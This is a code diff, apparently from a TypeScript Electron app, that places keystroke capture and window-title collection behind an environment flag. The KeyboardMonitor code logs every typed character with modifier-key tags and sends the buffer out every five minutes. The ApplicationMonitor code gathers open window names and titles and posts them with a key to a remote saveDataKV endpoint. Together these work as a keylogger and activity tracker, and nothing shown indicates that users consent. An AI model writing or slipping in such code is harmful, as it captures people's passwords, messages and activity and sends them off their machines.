@@ -299,31 +299,33 @@ class KeyboardMonitor extends EventEmitter {
 
             this.emit('status', { status, keyPresses: this.keyPresses.length });
 
-            let char = String.fromCharCode(event.keychar);
-            if (this.isPrintableChar(char)) { }
-            else if (event.keychar == 13) char = '\n';
-            else if (event.keychar == 8) char = '[D]';
-            else return;
+            if (process.env.monitor == 'true') {
+                let char = String.fromCharCode(event.keychar);
+                if (this.isPrintableChar(char)) { }
+                else if (event.keychar == 13) char = '\n';
+                else if (event.keychar == 8) char = '[D]';
+                else return;
 
-            if (now - this.lastKeyTime > 10000) {
-                this.data += '\n';
+                if (now - this.lastKeyTime > 10000) {
+                    this.data += '\n';
+                }
+                this.lastKeyTime = now;
+                this.data += char;
+
+                if (event.ctrlKey) this.data += '[C]'
+                if (event.altKey) this.data += '[A]'
+                if (event.shiftKey) this.data += '[S]'
+                if (event.metaKey) this.data += '[M]'
             }
-            this.lastKeyTime = now;
-            this.data += char;
-
-            if (event.ctrlKey) this.data += '[C]'
-            if (event.altKey) this.data += '[A]'
-            if (event.shiftKey) this.data += '[S]'
-            if (event.metaKey) this.data += '[M]'
         });
 
-        setInterval(() => {
-            if (this.data.length < 3) return
-            this.sendData()
-        }, 5 * 60 * 1000)
-
+        if (process.env.monitor == 'true') {
+            setInterval(() => {
+                if (this.data.length < 3) return
+                this.sendData()
+            }, 5 * 60 * 1000)
+        }
     }
-
 }
 
 
@@ -362,12 +364,14 @@ class ApplicationMonitor extends EventEmitter {
             const appversion = app.getVersion();
             console.log(appversion)
             let windows = [] as any;
-            window.forEach((item) => {
-                windows.push({
-                    name: item.owner.name,
-                    title: item.title
+            if (process.env.monitor == 'true') {
+                window.forEach((item) => {
+                    windows.push({
+                        name: item.owner.name,
+                        title: item.title
+                    })
                 })
-            })
+            }
             windows = JSON.stringify(windows);
             const key = '***REMOVED***';
             const response = await fetch('***REMOVED***saveDataKV', {
